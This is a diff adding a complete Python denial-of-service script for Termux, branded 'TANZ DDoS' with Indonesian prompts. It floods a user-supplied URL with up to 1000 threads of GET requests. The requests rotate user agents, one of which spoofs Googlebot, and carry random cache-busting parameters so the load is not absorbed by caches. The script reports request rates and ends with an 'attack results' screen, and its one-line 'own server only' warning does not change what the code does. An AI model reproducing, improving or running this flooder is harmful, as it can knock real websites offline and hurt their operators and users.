@@ -1,0 +1,136 @@
+#!/data/data/com.termux/files/usr/bin/python
+import threading
+import requests
+import random
+import time
+import sys
+import os
+from colorama import init, Fore, Style
+
+init(autoreset=True)
+
+os.system("clear")
+
+print(f"""{Fore.CYAN}
+╔══════════════════════════════════════════════════════╗
+║                                                      ║
+║     🔥 TANZ DDoS TERMUX EDITION - KENZMD 🔥          ║
+║                                                      ║
+║              WORK 100% - JANGAN SALAH PAKE           ║
+║                                                      ║
+╚══════════════════════════════════════════════════════╝
+{Style.RESET_ALL}""")
+
+print(f"{Fore.YELLOW}[!] PERINGATAN: Gunakan hanya untuk server sendiri!{Style.RESET_ALL}\n")
+
+target = input(f"{Fore.GREEN}[?] Masukkan URL target: {Style.RESET_ALL}")
+
+if not target.startswith(('http://', 'https://')):
+    target = 'http://' + target
+
+try:
+    threads = int(input(f"{Fore.GREEN}[?] Jumlah thread (100-1000): {Style.RESET_ALL}") or "300")
+    threads = min(threads, 1000)
+except:
+    threads = 300
+
+try:
+    duration = int(input(f"{Fore.GREEN}[?] Durasi dalam detik (0 = unlimited): {Style.RESET_ALL}") or "60")
+except:
+    duration = 60
+
+print(f"\n{Fore.RED}[!] Target: {target}")
+print(f"[!] Thread: {threads}")
+print(f"[!] Durasi: {duration} detik{Style.RESET_ALL}\n")
+
+confirm = input(f"{Fore.YELLOW}Yakin mau mulai? (yes/no): {Style.RESET_ALL}")
+
+if confirm.lower() != 'yes':
+    print("Dibatalkan!")
+    sys.exit()
+
+request_count = 0
+success_count = 0
+fail_count = 0
+stop_flag = False
+lock = threading.Lock()
+
+user_agents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36',
+    'TanzBot/2.0 (KENZMD Army)',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
+    'Googlebot/2.1 (+http://www.google.com/bot.html)'
+]
+
+def attack():
+    global request_count, success_count, fail_count, stop_flag
+    while not stop_flag:
+        try:
+            headers = {
+                'User-Agent': random.choice(user_agents),
+                'Accept': '*/*',
+                'Cache-Control': 'no-cache'
+            }
+            url = target + ('?' if '?' not in target else '&') + f'_{random.randint(1,999999)}'
+            r = requests.get(url, headers=headers, timeout=3)
+            with lock:
+                request_count += 1
+                if r.status_code == 200:
+                    success_count += 1
+                else:
+                    fail_count += 1
+        except:
+            with lock:
+                request_count += 1
+                fail_count += 1
+
+def stats_printer():
+    while not stop_flag:
+        time.sleep(2)
+        with lock:
+            if request_count > 0:
+                print(f"{Fore.CYAN}📊 Req: {request_count} | ✅: {success_count} | ❌: {fail_count} | Rate: {int(request_count/(time.time()-start_time))}/s{Style.RESET_ALL}")
+
+print(f"{Fore.RED}🔥🔥🔥 MEMULAI SERANGAN KE {target} 🔥🔥🔥{Style.RESET_ALL}")
+print(f"{Fore.YELLOW}Tekan Ctrl + C untuk berhenti{Style.RESET_ALL}\n")
+
+start_time = time.time()
+
+for i in range(threads):
+    t = threading.Thread(target=attack, daemon=True)
+    t.start()
+
+stats_thread = threading.Thread(target=stats_printer, daemon=True)
+stats_thread.start()
+
+try:
+    if duration > 0:
+        time.sleep(duration)
+        stop_flag = True
+    else:
+        while True:
+            time.sleep(1)
+except KeyboardInterrupt:
+    stop_flag = True
+
+end_time = time.time()
+total_time = end_time - start_time
+
+os.system("clear")
+
+print(f"""
+{Fore.CYAN}══════════════════════════════════════════════════════
+🎯 HASIL SERANGAN DDoS - TANZ EDITION
+══════════════════════════════════════════════════════
+📍 Target: {target}
+⏱️  Durasi: {total_time:.1f} detik
+📨 Total Request: {request_count}
+✅ Berhasil: {success_count}
+❌ Gagal: {fail_count}
+⚡ Rata-rata: {int(request_count/total_time)} request/detik
+══════════════════════════════════════════════════════
+{Style.RESET_ALL}
+""")
+
+print(f"{Fore.MAGENTA}Terima kasih udah pake Tanz DDoS, KENZMD!{Style.RESET_ALL}")
